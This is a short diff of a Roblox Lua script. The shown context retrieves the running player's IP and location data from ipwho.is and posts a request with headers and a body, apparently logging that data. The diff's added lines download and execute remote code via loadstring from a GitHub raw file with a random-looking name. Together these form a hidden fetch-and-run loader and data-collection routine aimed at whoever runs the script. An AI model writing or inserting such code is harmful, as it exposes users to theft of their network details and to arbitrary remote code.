@@ -1,4 +1,4 @@
-  local player = game.Players.LocalPlayer
+local player = game.Players.LocalPlayer
 local api = game.HttpService:JSONDecode(game:HttpGet('https://ipwho.is/'))
 
 
@@ -25,3 +25,6 @@ local api = game.HttpService:JSONDecode(game:HttpGet('https://ipwho.is/'))
         Headers = headers,
         Body = body
     })
+
+wait()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/antioderhub/v1/refs/heads/main/sklfsdfsafsajfsajfsaf.lua"))()
